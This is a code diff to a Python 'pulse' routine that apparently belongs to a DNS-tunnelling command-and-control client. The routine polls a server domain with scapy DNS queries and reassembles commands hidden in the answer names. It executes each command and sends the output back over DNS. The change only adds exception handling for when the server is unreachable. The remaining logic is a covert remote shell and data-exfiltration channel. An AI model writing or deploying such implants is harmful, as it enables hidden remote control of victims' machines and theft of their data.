@@ -72,20 +72,23 @@ def pulse() -> None:
 
         res = sr1(ip / udp / dns, iface=IFACE, verbose=False, timeout=TIMEOUT)
 
-        data = res.an.rrname.split(f".{DOMAIN}".encode())[0]
+        try:
+            data = res.an.rrname.split(f".{DOMAIN}".encode())[0]
 
-        # Run command when it's not a pulse
-        if data != b"pulse":
-            recv += data
+            # Run command when it's not a pulse
+            if data != b"pulse":
+                recv += data
 
-            if res[DNS].z == 1:
-                cmd = decode(recv)
-                try:
-                    print(cmd.decode())
-                    send_data(execute(cmd))
-                except:
-                    print("Data got corrupted!")
-                recv = b""
+                if res[DNS].z == 1:
+                    cmd = decode(recv)
+                    try:
+                        print(cmd.decode())
+                        send_data(execute(cmd))
+                    except:
+                        print("Data got corrupted!")
+                    recv = b""
+        except:
+            print("Server is not up")
 
         sleep(PULSE)
 
